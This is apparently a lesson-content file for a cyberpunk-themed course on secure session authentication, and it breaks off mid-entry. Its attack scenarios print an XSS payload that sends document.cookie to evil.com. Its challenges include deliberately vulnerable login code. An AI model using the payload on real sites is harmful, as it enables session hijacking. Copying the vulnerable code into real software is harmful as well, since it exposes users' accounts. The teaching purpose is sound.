/**
 * Session Authentication Lesson Content
 * Theme: KEYCARD PROTOCOL - Cyberpunk 2084
 */

export const sessionAuthContent = {
  storyHook: {
    title: "KEYCARD PROTOCOL",
    subtitle: "Session-Based Authentication",
    clearanceLevel: "Basic Access",
    status: "ACTIVE",
    narrative: `You're entering NeoTech Tower - a high-security corporate stronghold in 2084.
At the entrance checkpoint, security verifies your retina scan and issues you a physical keycard.
This card is your SESSION - it grants access to authorized zones, tracks your movements, and expires
at midnight. Lose it? You're locked out instantly. Let someone steal it? They have full access until you report it.`,
  },

  sections: [
    // ESSENTIAL SECTIONS
    {
      id: 'section-1',
      category: 'essential',
      title: 'Access Granted: What is Session Auth?',
      icon: 'Key',
      content: `Session authentication is like a physical keycard at a building. When you successfully log in,
the server creates a unique session ID and sends it to your browser as a cookie. This cookie is automatically
included in every subsequent request, allowing the server to "remember" who you are.

Unlike stateless authentication (JWT), sessions are **stateful** - the server maintains a record of all active
sessions in memory or a database. This gives you instant control: logout, and the session is destroyed immediately.

Think of it as the difference between a keycard (session) and a passport (JWT). The keycard only works while
the building's security system knows it's valid. Lose the keycard, and security can deactivate it instantly.`,
      keyPoints: [
        'Server creates a unique session ID on successful login',
        'Session ID stored as HTTP-Only cookie in browser',
        'Server maintains session data (stateful architecture)',
        'Cookie automatically sent with every request',
        'Instant revocation when user logs out'
      ],
      visual: 'Side-by-side comparison: Physical keycard ↔ Session cookie',
    },
    {
      id: 'section-2',
      category: 'essential',
      title: 'The Authentication Sequence',
      icon: 'GitBranch',
      content: `The session authentication flow has 7 critical steps, each designed to maximize security while
maintaining simplicity. Understanding this flow is essential for implementing secure authentication.

Step 1: User submits credentials (username + password)
Step 2: Server verifies password hash using bcrypt
Step 3: Server generates cryptographically random session ID
Step 4: Server stores session data in database (user ID, creation time, expiry)
Step 5: Server sets HTTP-Only cookie with session ID
Step 6: Browser automatically sends cookie with subsequent requests
Step 7: Server validates session ID and retrieves user data

Each step has security implications. Skip session ID generation randomness? Attackers can guess IDs.
Forget HTTP-Only flag? JavaScript can steal cookies via XSS. Understanding WHY each step exists is key.`,
      keyPoints: [
        'Always hash passwords with bcrypt (never store plain text)',
        'Use crypto.randomBytes for session ID generation',
        'Store sessions server-side with expiration timestamps',
        'Set HTTP-Only cookie to prevent JavaScript access',
        'Validate session on every protected request'
      ],
      visual: 'Flow diagram with 7 numbered steps showing client-server interaction',
    },
    {
      id: 'section-3',
      category: 'essential',
      title: 'Cookie Security Protocols',
      icon: 'Shield',
      content: `HTTP cookies have four critical security attributes that transform a simple text value into
a secure authentication mechanism. Missing even ONE attribute can create serious vulnerabilities.

**HTTP-Only**: Prevents JavaScript from reading the cookie via document.cookie. This stops XSS attacks
from stealing session IDs. Without this, a single script injection can compromise every user session.

**Secure**: Cookie only sent over HTTPS, never HTTP. Prevents network sniffing attacks. In 2084's
surveillance state, unencrypted traffic is basically broadcasting your credentials.

**SameSite=Strict**: Prevents cross-site request forgery (CSRF). Cookie won't be sent if request
originates from another domain. Your session can't be hijacked by evil.com.

**Max-Age**: Session expiration in seconds. Limits the damage window if a session is stolen.
Short timeouts (15-30 minutes) are standard for high-security applications.`,
      keyPoints: [
        'HTTP-Only stops XSS cookie theft (blocks document.cookie)',
        'Secure flag prevents network sniffing (HTTPS only)',
        'SameSite=Strict prevents CSRF attacks (blocks cross-origin)',
        'Max-Age limits exposure window (typically 15-30 min)',
        'All four attributes must be set for maximum security'
      ],
      visual: 'Table showing: Attribute | Protection | Attack Prevented',
      codeExamples: {
        javascript: `// Express.js - Setting secure session cookie
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);
  const sessionId = crypto.randomBytes(32).toString('hex');

  await db.sessions.create({
    id: sessionId,
    userId: user.id,
    expiresAt: Date.now() + 30 * 60 * 1000 // 30 minutes
  });

  res.cookie('sessionId', sessionId, {
    httpOnly: true,           // Prevents XSS
    secure: true,             // HTTPS only
    sameSite: 'strict',       // Prevents CSRF
    maxAge: 30 * 60 * 1000    // 30 minutes
  });

  res.json({ success: true, user: { id: user.id, email: user.email } });
});`,
        python: `# Flask - Setting secure session cookie
@app.route('/login', methods=['POST'])
def login():
    user = verify_credentials(request.json)
    session_id = secrets.token_hex(32)

    db.sessions.insert({
        'id': session_id,
        'user_id': user.id,
        'expires_at': datetime.now() + timedelta(minutes=30)
    })

    response = jsonify({'success': True, 'user': {'id': user.id, 'email': user.email}})
    response.set_cookie(
        'sessionId',
        session_id,
        httponly=True,        # Prevents XSS
        secure=True,          # HTTPS only
        samesite='Strict',    # Prevents CSRF
        max_age=1800          # 30 minutes
    )

    return response`,
        csharp: `// ASP.NET Core - Setting secure session cookie
[HttpPost("login")]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    var user = await VerifyCredentials(request);
    var sessionId = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));

    await _db.Sessions.AddAsync(new Session
    {
        Id = sessionId,
        UserId = user.Id,
        ExpiresAt = DateTime.UtcNow.AddMinutes(30)
    });
    await _db.SaveChangesAsync();

    Response.Cookies.Append("sessionId", sessionId, new CookieOptions
    {
        HttpOnly = true,         // Prevents XSS
        Secure = true,           // HTTPS only
        SameSite = SameSiteMode.Strict,  // Prevents CSRF
        MaxAge = TimeSpan.FromMinutes(30)
    });

    return Ok(new { success = true, user = new { id = user.Id, email = user.Email } });
}`,
        ruby: `# Rails - Setting secure session cookie
def login
  user = verify_credentials(params)
  session_id = SecureRandom.hex(32)

  Session.create!(
    id: session_id,
    user_id: user.id,
    expires_at: 30.minutes.from_now
  )

  cookies[:sessionId] = {
    value: session_id,
    httponly: true,      # Prevents XSS
    secure: true,        # HTTPS only
    same_site: :strict,  # Prevents CSRF
    expires: 30.minutes.from_now
  }

  render json: { success: true, user: { id: user.id, email: user.email } }
end`
      }
    },

    // IMPORTANT SECTIONS
    {
      id: 'section-4',
      category: 'important',
      title: 'Session Storage: Where to Keep State',
      icon: 'Database',
      content: `Choosing where to store sessions impacts performance, scalability, and reliability.
In 2084's cloud infrastructure, the wrong choice can mean the difference between milliseconds and disaster.

**In-Memory (Process RAM)**: Fastest option - sessions live in application memory. Perfect for development
or single-server apps. Downside: Server restart = all users logged out. Horizontal scaling impossible.

**Database (PostgreSQL/MySQL)**: Persistent storage survives restarts. Works across multiple servers.
Slower than memory (disk I/O), but reliable. Good for traditional monoliths with moderate traffic.

**Redis/Memcached**: Best of both worlds - in-memory speed with persistence and replication. Can scale
horizontally. Industry standard for high-traffic apps. Netflix, Twitter, GitHub all use Redis for sessions.`,
      keyPoints: [
        'In-Memory: Fastest but lost on restart, no horizontal scaling',
        'Database: Persistent and scalable but slower (disk I/O)',
        'Redis: In-memory speed + persistence + replication',
        'Choose based on traffic, uptime requirements, and budget',
        'Redis is industry standard for production applications'
      ],
      visual: 'Comparison table: Storage Type | Speed | Persistence | Scaling | Use Case',
    },
    {
      id: 'section-5',
      category: 'important',
      title: 'Session Lifecycle: Birth to Termination',
      icon: 'RefreshCw',
      content: `Sessions have four lifecycle stages: Creation, Refresh, Regeneration, and Destruction.
Mastering these stages is critical for security and user experience.

**Creation**: On successful login, generate a cryptographically random ID, store session data, set cookie.
Never reuse old session IDs - always create fresh ones.

**Refresh**: Extend session expiration on user activity (sliding expiration). User actively browsing?
Don't force re-login every 30 minutes. Update lastActivity timestamp and push expiration forward.

**Regeneration**: CRITICAL security step - after privilege changes (login, role upgrade), regenerate
the session ID while preserving data. Prevents session fixation attacks where attackers set your ID.

**Destruction**: On logout or expiration, delete session from storage and clear cookie. Incomplete
logout is a security vulnerability - always clean up both server and client state.`,
      keyPoints: [
        'Creation: Fresh random ID + store data + set cookie',
        'Refresh: Sliding expiration extends on activity',
        'Regeneration: New ID after login/privilege change (security!)',
        'Destruction: Delete server data + clear client cookie',
        'Never reuse session IDs - always generate new ones'
      ],
      visual: 'Timeline diagram showing session states over time',
      codeExamples: {
        javascript: `// Session Regeneration (prevents fixation attacks)
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);

  // Invalidate old session if exists
  const oldSessionId = req.cookies.sessionId;
  if (oldSessionId) {
    await db.sessions.delete({ id: oldSessionId });
  }

  // Always generate NEW session ID after login
  const newSessionId = crypto.randomBytes(32).toString('hex');

  await db.sessions.create({
    id: newSessionId,
    userId: user.id,
    expiresAt: Date.now() + 30 * 60 * 1000
  });

  res.cookie('sessionId', newSessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 30 * 60 * 1000
  });

  res.json({ success: true });
});`,
        python: `# Session Regeneration (prevents fixation attacks)
@app.route('/login', methods=['POST'])
def login():
    user = verify_credentials(request.json)

    # Invalidate old session if exists
    old_session_id = request.cookies.get('sessionId')
    if old_session_id:
        db.sessions.delete(id=old_session_id)

    # Always generate NEW session ID after login
    new_session_id = secrets.token_hex(32)

    db.sessions.insert({
        'id': new_session_id,
        'user_id': user.id,
        'expires_at': datetime.now() + timedelta(minutes=30)
    })

    response = jsonify({'success': True})
    response.set_cookie('sessionId', new_session_id,
        httponly=True, secure=True, samesite='Strict', max_age=1800)

    return response`,
        csharp: `// Session Regeneration (prevents fixation attacks)
[HttpPost("login")]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    var user = await VerifyCredentials(request);

    // Invalidate old session if exists
    if (Request.Cookies.TryGetValue("sessionId", out var oldSessionId))
    {
        var oldSession = await _db.Sessions.FindAsync(oldSessionId);
        if (oldSession != null) _db.Sessions.Remove(oldSession);
    }

    // Always generate NEW session ID after login
    var newSessionId = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));

    await _db.Sessions.AddAsync(new Session
    {
        Id = newSessionId,
        UserId = user.Id,
        ExpiresAt = DateTime.UtcNow.AddMinutes(30)
    });
    await _db.SaveChangesAsync();

    Response.Cookies.Append("sessionId", newSessionId, new CookieOptions
    {
        HttpOnly = true,
        Secure = true,
        SameSite = SameSiteMode.Strict,
        MaxAge = TimeSpan.FromMinutes(30)
    });

    return Ok(new { success = true });
}`,
        ruby: `# Session Regeneration (prevents fixation attacks)
def login
  user = verify_credentials(params)

  # Invalidate old session if exists
  old_session_id = cookies[:sessionId]
  Session.find_by(id: old_session_id)&.destroy if old_session_id

  # Always generate NEW session ID after login
  new_session_id = SecureRandom.hex(32)

  Session.create!(
    id: new_session_id,
    user_id: user.id,
    expires_at: 30.minutes.from_now
  )

  cookies[:sessionId] = {
    value: new_session_id,
    httponly: true,
    secure: true,
    same_site: :strict,
    expires: 30.minutes.from_now
  }

  render json: { success: true }
end`
      }
    },
    {
      id: 'section-6',
      category: 'important',
      title: 'Session vs JWT: Choosing Your Protocol',
      icon: 'GitCompare',
      content: `In 2084's megacity, choosing between Session and JWT is like choosing between a keycard
and a digital passport. Both grant access, but they work fundamentally differently.

**Session**: Server maintains state. Every request requires database lookup. Instant revocation (delete
session = user logged out). Perfect for traditional web apps where server control is critical.

**JWT**: Stateless tokens. No database lookup needed. Can't revoke until expiration. Perfect for mobile
apps, microservices, and scenarios where horizontal scaling matters more than instant control.

When to choose **Session**:
- Traditional server-rendered web applications
- Need instant logout/revocation capability
- Strong security requirements (banking, healthcare)
- Single application (not distributed microservices)

When to choose **JWT**:
- Mobile applications (avoid server round-trips)
- Microservices architecture (no shared session store)
- Horizontal scaling priority
- API-first design (REST/GraphQL)`,
      keyPoints: [
        'Session: Stateful, instant revocation, database lookup required',
        'JWT: Stateless, no revocation, no database lookup needed',
        'Session better for: Web apps, strict security, instant logout',
        'JWT better for: Mobile apps, microservices, scaling',
        'Hybrid approach possible: Use both for different purposes'
      ],
      visual: 'Side-by-side comparison table with checkmarks/crosses',
    },

    // ADVANCED SECTIONS
    {
      id: 'section-7',
      category: 'advanced',
      title: 'Security Breach Scenarios',
      icon: 'AlertTriangle',
      content: `In 2084's digital warfare landscape, three session attacks dominate the threat matrix.
Understanding these attacks - and their defenses - separates amateur coders from security guardians.

These aren't theoretical vulnerabilities. They're exploited daily against real applications. Companies
lose millions because developers skip HTTP-Only flags or forget session regeneration. Don't be that developer.

Each scenario below shows the attack flow, what the hacker gains, and how to defend. Study them.
Practice them. Make these defenses automatic in your code.`,
      keyPoints: [
        'Session Hijacking: Stolen cookies grant full account access',
        'Session Fixation: Attacker sets your session ID before login',
        'CSRF Attacks: Malicious sites make requests using your session',
        'All three are preventable with proper cookie configuration',
        'Defense-in-depth: Multiple layers of protection'
      ],
      visual: 'Three security scenario cards (handled by SecurityScenario component)',
    },
    {
      id: 'section-8',
      category: 'advanced',
      title: 'Scaling to Millions: Enterprise Patterns',
      icon: 'TrendingUp',
      content: `When NeoTech Tower scales from 1,000 to 1,000,000 concurrent users, session architecture
must evolve. Here's how enterprise applications handle massive scale.

**Sticky Sessions (Load Balancer)**: Route users to same server based on session ID. Simplest approach
but creates "hot spots" - one server might get overloaded while others idle. Not recommended for 2084.

**Centralized Session Store (Redis Cluster)**: All servers share a Redis cluster for session storage.
Any server can validate any session. This is the industry standard. Scales horizontally, handles failures.

**Session Replication**: Each server maintains session data, replicates to peers. High redundancy but
complex synchronization. Used by banks and mission-critical systems.

**Stateless Alternative (JWT)**: Eliminate sessions entirely. Trade server control for scalability.
Popular for microservices where session storage becomes a bottleneck.`,
      keyPoints: [
        'Sticky sessions: Simple but creates hotspots, not recommended',
        'Redis cluster: Industry standard, horizontal scaling, high availability',
        'Session replication: Maximum redundancy, complex setup',
        'JWT migration: Trade control for scalability',
        'Netflix, Twitter, GitHub all use Redis for session storage'
      ],
      visual: 'Architecture diagram showing load balancer → multiple servers → Redis cluster',
    },
    {
      id: 'section-9',
      category: 'advanced',
      title: "The Guardian's Checklist: Best Practices",
      icon: 'CheckCircle',
      content: `You've mastered the theory. Now lock it down with these battle-tested best practices
from 2084's top security teams.

**Short Expiration**: 15-30 minute idle timeout for sensitive apps (banking, admin). 1-2 hours for
casual apps (social media). Shorter = more secure but worse UX. Find the balance for your use case.

**Regenerate on Privilege Change**: User logs in? New session ID. User upgrades to admin? New session ID.
Any privilege change = regenerate. Prevents fixation and elevation attacks.

**Monitor Active Sessions**: Show users "Your active sessions" page. Let them revoke specific devices.
Detect anomalies (IP changes, unusual activity). Netflix does this beautifully.

**Secure "Remember Me"**: Never extend session timeout to weeks/months. Instead: issue a separate
long-lived token (stored securely) that can create new sessions. Revocable separately from sessions.

**Audit Logging**: Log every session creation, validation failure, and logout. When breach happens
(not if), you'll need forensics. Timestamp, IP, user agent, session ID (first 10 chars only).`,
      keyPoints: [
        'Short timeouts: 15-30 min sensitive, 1-2 hours casual',
        'Regenerate ID on privilege changes (login, role upgrade)',
        'Let users monitor and revoke active sessions',
        '"Remember me" = separate token, not extended session',
        'Comprehensive audit logging for forensics'
      ],
      visual: 'Checklist with code examples for each practice',
    },
  ],

  securityScenarios: [
    {
      id: 'scenario-1',
      name: 'The Cookie Thief: XSS Session Hijacking',
      threatLevel: 'HIGH',
      attack: `A hacker injects malicious JavaScript into your web app via an unvalidated comment field.
The script executes: \`<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>\`.
If HTTP-Only is FALSE, the attacker receives your session cookie instantly.`,
      exploitation: `The attacker now has your session ID. They set it in their browser and refresh the page.
The server sees a valid session cookie, validates it, and grants full access. The attacker is now logged
in as YOU - with all your permissions, data access, and account control.`,
      defense: `Set HTTP-Only=true on cookies. This flag makes cookies inaccessible to JavaScript -
document.cookie returns empty. The XSS attack still happens, but it can't steal sessions. Additionally,
use Content Security Policy (CSP) headers to prevent inline scripts altogether.`,
      interactive: 'Try to steal a cookie with/without HTTP-Only flag using browser console'
    },
    {
      id: 'scenario-2',
      name: 'The Session Fixer: ID Fixation Attack',
      threatLevel: 'MEDIUM',
      attack: `An attacker sends you a link: \`neotech.com/login?sessionId=HACKER_CONTROLLED\`.
You click it and log in successfully. The server, if poorly coded, accepts the session ID from the URL
and uses it for your authenticated session.`,
      exploitation: `The attacker already knows the session ID (they generated it). They don't need to
steal anything - they SET it beforehand. After you log in, they simply use that same session ID to access
your account. You did the work of logging in FOR them.`,
      defense: `ALWAYS regenerate session ID after successful login. Never accept client-provided session IDs.
The server must generate a fresh, cryptographically random ID and invalidate any existing session. This
simple step makes fixation attacks impossible.`,
      interactive: 'View code comparison: vulnerable vs secure session creation'
    },
    {
      id: 'scenario-3',
      name: 'The Forgotten Logout: Shared Computer Risk',
      threatLevel: 'LOW',
      attack: `You log into NeoTech's portal at a public library. You finish your work, close the browser
tab (but don't click "Logout"), and leave. The session cookie remains valid in the browser.`,
      exploitation: `The next person on that computer opens a new tab and navigates to neotech.com. The
browser automatically sends your still-valid session cookie. The server validates it and grants access.
They're now browsing as you, viewing your data, possibly making changes.`,
      defense: `Implement short idle timeouts (15-30 minutes). Use sliding expiration - extend timeout
on activity, but not indefinitely. Offer "Logout all devices" feature. Educate users about public computer
risks. Consider prompting "Are you on a public computer?" and offering single-session mode.`,
      interactive: 'Set different timeout values and observe session expiration behavior'
    }
  ],

  challenges: [
    {
      id: 'challenge-1',
      name: 'Decode the Breach',
      difficulty: 'EASY',
      description: `You've intercepted a session cookie from a poorly secured application. Examine its
attributes and identify the security vulnerabilities. Add the missing security flags to make it secure.`,
      startingCode: `// Vulnerable cookie configuration
res.cookie('sessionId', sessionId, {
  maxAge: 24 * 60 * 60 * 1000 // 24 hours
});`,
      successCriteria: ['Add httpOnly flag', 'Add secure flag', 'Add sameSite=strict', 'Reduce maxAge to 30 minutes'],
      badge: 'Security Initiate',
      reward: 'Shield icon badge + 10% progress'
    },
    {
      id: 'challenge-2',
      name: 'Build the Fort',
      difficulty: 'MEDIUM',
      description: `Implement a complete, production-ready session creation flow. Your code must hash
passwords, generate secure session IDs, store sessions, and set properly configured cookies.`,
      startingCode: `// TODO: Complete this login endpoint
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // TODO: Verify credentials
  // TODO: Generate secure session ID
  // TODO: Store session in database
  // TODO: Set secure cookie
  // TODO: Return success response
});`,
      successCriteria: [
        'Use bcrypt for password verification',
        'Generate crypto-random session ID (32 bytes)',
        'Store session with expiration',
        'Set cookie with all 4 security attributes',
        'Handle errors properly'
      ],
      badge: 'Auth Architect',
      reward: 'Star icon badge + 15% progress'
    },
    {
      id: 'challenge-3',
      name: 'Hunt the Hacker',
      difficulty: 'HARD',
      description: `This code has FIVE critical vulnerabilities that make it hackable. Find them all
and patch each one. Vulnerabilities range from XSS exposure to session fixation to timing attacks.`,
      startingCode: `// VULNERABLE CODE - Find and fix 5 security issues
app.post('/login', async (req, res) => {
  const { username, password, sessionId } = req.body;

  const user = await db.users.findOne({ username });
  if (!user || user.password !== password) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const session = sessionId || Math.random().toString();
  await db.sessions.create({ id: session, userId: user.id });

  res.cookie('sessionId', session);
  res.json({ success: true, user: user });
});`,
      successCriteria: [
        'Fix #1: Hash password comparison (bcrypt)',
        'Fix #2: Never accept client session IDs',
        'Fix #3: Use crypto-random ID generation',
        'Fix #4: Add cookie security flags',
        'Fix #5: Don\'t return sensitive user data'
      ],
      badge: 'Security Guardian',
      reward: 'Award icon badge + 25% progress'
    }
  ],

  achievements: {
    levels: [
      {
        id: 'protocol-initiate',
        name: 'Protocol Initiate',
        range: [0, 30],
        description: 'You understand the basics of session authentication',
        icon: 'Shield',
        color: 'text-blue-400'
      },
      {
        id: 'security-operative',
        name: 'Security Operative',
        range: [31, 60],
        description: 'You can implement production-ready session auth',
        icon: 'ShieldCheck',
        color: 'text-neon-400'
      },
      {
        id: 'elite-guardian',
        name: 'Elite Guardian',
        range: [61, 90],
        description: 'You master advanced security patterns and scaling',
        icon: 'ShieldAlert',
        color: 'text-purple-400'
      },
      {
        id: 'master-architect',
        name: 'Master Architect',
        range: [91, 100],
        description: 'You have achieved complete mastery of session authentication',
        icon: 'Award',
        color: 'text-yellow-400'
      }
    ],
    calculateProgress: (completedSections: string[], completedChallenges: string[]) => {
      const sectionWeight = 70; // 70% of progress from sections
      const challengeWeight = 30; // 30% from challenges

      const sectionProgress = (completedSections.length / 9) * sectionWeight;
      const challengeProgress = (completedChallenges.length / 3) * challengeWeight;

      return Math.floor(sectionProgress + challengeProgress);
    },
    getLevel: (percentage: number) => {
      if (percentage >= 91) return 'master-architect';
      if (percentage >= 61) return 'elite-guardian';
      if (percentage >= 31) return 'security-operative';
      return 'protocol-initiate';
    }
  },

  crossReferences: {
    jwt: {
      title: 'Ready to Level Up? Learn JWT',
      description: `JWT (JSON Web Tokens) is the stateless alternative to sessions. Instead of storing
state on the server, all authentication data lives in the token itself. Perfect for mobile apps and
microservices where server-side sessions become a bottleneck.`,
      link: '/jwt/learn'
    },
    mfa: {
      title: 'Add Maximum Security with MFA',
      description: `Multi-Factor Authentication adds a second verification layer beyond passwords.
Even if session cookies are stolen, attackers can't access the account without the second factor.
Banking, healthcare, and admin panels require MFA for compliance.`,
      link: '/mfa/learn'
    },
    oauth: {
      title: 'Learn Delegation with OAuth 2.0',
      description: `OAuth lets users grant limited access without sharing passwords. "Login with Google"
uses OAuth - Google authenticates the user, your app receives an access token. Sessions can store
OAuth tokens for API calls.`,
      link: '/oauth/learn'
    }
  }
};

/**
 * Code Examples for Session Authentication
 * Organized by topic for easy component integration
 */
export const codeExamples = {
  settingCookie: [
    {
      language: 'javascript' as const,
      label: 'JavaScript',
      code: `// Express.js - Setting secure session cookie
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);
  const sessionId = crypto.randomBytes(32).toString('hex');

  await db.sessions.create({
    id: sessionId,
    userId: user.id,
    expiresAt: Date.now() + 30 * 60 * 1000 // 30 minutes
  });

  res.cookie('sessionId', sessionId, {
    httpOnly: true,           // Prevents XSS
    secure: true,             // HTTPS only
    sameSite: 'strict',       // Prevents CSRF
    maxAge: 30 * 60 * 1000    // 30 minutes
  });

  res.json({ success: true, user: { id: user.id, email: user.email } });
});`
    },
    {
      language: 'python' as const,
      label: 'Python',
      code: `# Flask - Setting secure session cookie
@app.route('/login', methods=['POST'])
def login():
    user = verify_credentials(request.json)
    session_id = secrets.token_hex(32)

    db.sessions.insert({
        'id': session_id,
        'user_id': user.id,
        'expires_at': datetime.now() + timedelta(minutes=30)
    })

    response = jsonify({'success': True, 'user': {'id': user.id, 'email': user.email}})
    response.set_cookie(
        'sessionId',
        session_id,
        httponly=True,        # Prevents XSS
        secure=True,          # HTTPS only
        samesite='Strict',    # Prevents CSRF
        max_age=1800          # 30 minutes
    )

    return response`
    },
    {
      language: 'csharp' as const,
      label: 'C#',
      code: `// ASP.NET Core - Setting secure session cookie
[HttpPost("login")]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    var user = await VerifyCredentials(request);
    var sessionId = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));

    await _db.Sessions.AddAsync(new Session
    {
        Id = sessionId,
        UserId = user.Id,
        ExpiresAt = DateTime.UtcNow.AddMinutes(30)
    });
    await _db.SaveChangesAsync();

    Response.Cookies.Append("sessionId", sessionId, new CookieOptions
    {
        HttpOnly = true,         // Prevents XSS
        Secure = true,           // HTTPS only
        SameSite = SameSiteMode.Strict,  // Prevents CSRF
        MaxAge = TimeSpan.FromMinutes(30)
    });

    return Ok(new { success = true, user = new { id = user.Id, email = user.Email } });
}`
    },
    {
      language: 'ruby' as const,
      label: 'Ruby',
      code: `# Rails - Setting secure session cookie
def login
  user = verify_credentials(params)
  session_id = SecureRandom.hex(32)

  Session.create!(
    id: session_id,
    user_id: user.id,
    expires_at: 30.minutes.from_now
  )

  cookies[:sessionId] = {
    value: session_id,
    httponly: true,      # Prevents XSS
    secure: true,        # HTTPS only
    same_site: :strict,  # Prevents CSRF
    expires: 30.minutes.from_now
  }

  render json: { success: true, user: { id: user.id, email: user.email } }
end`
    }
  ],

  validatingSession: [
    {
      language: 'javascript' as const,
      label: 'JavaScript',
      code: `// Express.js - Session validation middleware
async function validateSession(req, res, next) {
  const sessionId = req.cookies.sessionId;

  if (!sessionId) {
    return res.status(401).json({ error: 'No session cookie' });
  }

  const session = await db.sessions.findOne({ id: sessionId });

  if (!session) {
    return res.status(401).json({ error: 'Invalid session' });
  }

  if (session.expiresAt < Date.now()) {
    await db.sessions.delete({ id: sessionId });
    return res.status(401).json({ error: 'Session expired' });
  }

  // Update last activity (sliding expiration)
  await db.sessions.update(
    { id: sessionId },
    { lastActivity: Date.now() }
  );

  req.user = await db.users.findOne({ id: session.userId });
  next();
}`
    },
    {
      language: 'python' as const,
      label: 'Python',
      code: `# Flask - Session validation decorator
def validate_session(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        session_id = request.cookies.get('sessionId')

        if not session_id:
            return jsonify({'error': 'No session cookie'}), 401

        session = db.sessions.find_one(id=session_id)

        if not session:
            return jsonify({'error': 'Invalid session'}), 401

        if session['expires_at'] < datetime.now():
            db.sessions.delete(id=session_id)
            return jsonify({'error': 'Session expired'}), 401

        # Update last activity
        db.sessions.update(
            {'id': session_id},
            {'last_activity': datetime.now()}
        )

        request.user = db.users.find_one(id=session['user_id'])
        return f(*args, **kwargs)

    return decorated_function`
    }
  ],

  sessionRegeneration: [
    {
      language: 'javascript' as const,
      label: 'JavaScript',
      code: `// Session Regeneration (prevents fixation attacks)
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);

  // Invalidate old session if exists
  const oldSessionId = req.cookies.sessionId;
  if (oldSessionId) {
    await db.sessions.delete({ id: oldSessionId });
  }

  // Always generate NEW session ID after login
  const newSessionId = crypto.randomBytes(32).toString('hex');

  await db.sessions.create({
    id: newSessionId,
    userId: user.id,
    expiresAt: Date.now() + 30 * 60 * 1000
  });

  res.cookie('sessionId', newSessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 30 * 60 * 1000
  });

  res.json({ success: true });
});`
    },
    {
      language: 'python' as const,
      label: 'Python',
      code: `# Session Regeneration (prevents fixation attacks)
@app.route('/login', methods=['POST'])
def login():
    user = verify_credentials(request.json)

    # Invalidate old session if exists
    old_session_id = request.cookies.get('sessionId')
    if old_session_id:
        db.sessions.delete(id=old_session_id)

    # Always generate NEW session ID after login
    new_session_id = secrets.token_hex(32)

    db.sessions.insert({
        'id': new_session_id,
        'user_id': user.id,
        'expires_at': datetime.now() + timedelta(minutes=30)
    })

    response = jsonify({'success': True})
    response.set_cookie('sessionId', new_session_id,
        httponly=True, secure=True, samesite='Strict', max_age=1800)

    return response`
    }
  ],

  logout: [
    {
      language: 'javascript' as const,
      label: 'JavaScript',
      code: `// Complete logout - server and client cleanup
app.post('/logout', async (req, res) => {
  const sessionId = req.cookies.sessionId;

  if (sessionId) {
    // Delete from database
    await db.sessions.delete({ id: sessionId });
  }

  // Clear cookie
  res.clearCookie('sessionId', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
  });

  res.json({ success: true, message: 'Logged out' });
});`
    },
    {
      language: 'python' as const,
      label: 'Python',
      code: `# Complete logout - server and client cleanup
@app.route('/logout', methods=['POST'])
def logout():
    session_id = request.cookies.get('sessionId')

    if session_id:
        # Delete from database
        db.sessions.delete(id=session_id)

    # Clear cookie
    response = jsonify({'success': True, 'message': 'Logged out'})
    response.set_cookie('sessionId', '', expires=0)

    return response`
    }
  ]
};

/**
 * Security Scenarios with code examples
 */
export const securityScenarios = [
  {
    id: 'scenario-1',
    title: 'The Cookie Thief: XSS Session Hijacking',
    threatLevel: 'HIGH' as const,
    attack: `A hacker injects malicious JavaScript into your web app via an unvalidated comment field. The script executes: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>. If HTTP-Only is FALSE, the attacker receives your session cookie instantly.`,
    exploitation: `The attacker now has your session ID. They set it in their browser and refresh the page. The server sees a valid session cookie, validates it, and grants full access. The attacker is now logged in as YOU - with all your permissions, data access, and account control.`,
    defense: `Set HTTP-Only=true on cookies. This flag makes cookies inaccessible to JavaScript - document.cookie returns empty. The XSS attack still happens, but it can't steal sessions. Additionally, use Content Security Policy (CSP) headers to prevent inline scripts altogether.`,
    vulnerableCode: {
      language: 'javascript' as const,
      label: 'Vulnerable Code',
      code: `// VULNERABLE - JavaScript can access cookie
res.cookie('sessionId', sessionId, {
  secure: true,
  sameSite: 'strict'
  // Missing httpOnly flag!
});

// Attacker's XSS payload:
// <script>
//   fetch('https://evil.com/steal?cookie=' + document.cookie)
// </script>`
    },
    secureCode: {
      language: 'javascript' as const,
      label: 'Secure Code',
      code: `// SECURE - Cookie protected from JavaScript
res.cookie('sessionId', sessionId, {
  httpOnly: true,    // Blocks document.cookie access
  secure: true,
  sameSite: 'strict'
});

// Add CSP header to prevent XSS
res.setHeader(
  'Content-Security-Policy',
  "script-src 'self'; object-src 'none';"
);`
    }
  },
  {
    id: 'scenario-2',
    title: 'The Session Fixer: ID Fixation Attack',
    threatLevel: 'MEDIUM' as const,
    attack: `An attacker sends you a link: neotech.com/login?sessionId=HACKER_CONTROLLED. You click it and log in successfully. The server, if poorly coded, accepts the session ID from the URL and uses it for your authenticated session.`,
    exploitation: `The attacker already knows the session ID (they generated it). They don't need to steal anything - they SET it beforehand. After you log in, they simply use that same session ID to access your account. You did the work of logging in FOR them.`,
    defense: `ALWAYS regenerate session ID after successful login. Never accept client-provided session IDs. The server must generate a fresh, cryptographically random ID and invalidate any existing session. This simple step makes fixation attacks impossible.`,
    vulnerableCode: {
      language: 'javascript' as const,
      label: 'Vulnerable Code',
      code: `// VULNERABLE - Accepts client-provided session ID
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);

  // DANGER: Using session ID from query string!
  const sessionId = req.query.sessionId || generateSessionId();

  await db.sessions.create({ id: sessionId, userId: user.id });
  res.cookie('sessionId', sessionId);
  res.json({ success: true });
});`
    },
    secureCode: {
      language: 'javascript' as const,
      label: 'Secure Code',
